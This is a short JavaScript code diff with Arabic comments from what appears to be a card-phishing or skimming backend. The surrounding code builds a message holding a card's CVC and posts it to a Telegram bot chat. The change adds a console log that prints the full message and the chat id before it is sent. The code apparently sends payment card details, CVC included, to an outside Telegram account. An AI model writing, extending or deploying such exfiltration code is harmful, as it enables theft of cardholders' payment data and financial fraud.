@@ -184,6 +184,13 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
     
     // إرسال الرسالة إلى تليجرام
     try {
+      // لوج مفصل لمحتوى الرسالة والبيانات
+      console.log('🚦 سيتم إرسال الرسالة إلى تليجرام:\n', {
+        chat_id: CHAT_ID,
+        text: formattedMessage,
+        length: formattedMessage.length
+      });
+      
       const telegramResponse = await axios.post(
         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
         {
